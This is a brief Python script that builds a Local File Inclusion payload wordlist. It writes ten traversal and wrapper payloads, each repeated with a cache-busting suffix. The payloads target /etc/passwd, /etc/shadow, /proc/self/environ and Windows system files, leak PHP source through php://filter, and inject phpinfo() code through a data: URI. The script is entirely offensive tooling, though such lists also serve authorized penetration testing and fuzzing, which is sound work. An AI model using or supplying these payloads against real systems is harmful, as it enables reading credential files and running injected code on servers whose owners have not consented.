lfi_payloads = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\boot.ini",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/proc/self/environ",
    "../../../../../../../../../../etc/shadow",
    "php://filter/convert.base64-encode/resource=index.php",
    "data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

with open("lfi_payloads.txt", "w", encoding="utf-8") as f:
    for i in range(1000):
        for payload in lfi_payloads:
            f.write(f"{payload}?v={i}\n")
